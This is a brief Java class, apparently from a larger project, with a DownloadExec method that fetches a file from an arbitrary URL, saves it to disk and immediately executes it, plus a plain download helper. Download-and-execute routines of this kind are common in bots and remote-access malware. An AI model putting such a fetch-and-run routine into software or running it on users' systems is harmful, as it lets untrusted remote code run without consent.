package fr.kaotic.func;

import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

public class httpFunction {

	public void DownloadExec(String url, String filename) throws MalformedURLException, IOException{
		URLToFile(filename, url);
		execFunction.execFile(filename);
	}
	
	public void URLToFile(String filename, String url){
		try{
			BufferedInputStream in = null;
			FileOutputStream fout = null;
			
			try{
				in = new BufferedInputStream(new URL(url).openStream());
				fout = new FileOutputStream(filename);
		
				byte data[] = new byte[1024];
				int count;
				while ((count = in.read(data, 0, 1024)) != -1)
				{
					fout.write(data, 0, count);
				}
			}finally{
				if (in != null)
					in.close();
				if (fout != null)
					fout.close();
			}
		}catch(MalformedURLException e1){
			e1.printStackTrace();
		}catch(IOException e2){
			e2.printStackTrace();
		}
			
	}
}
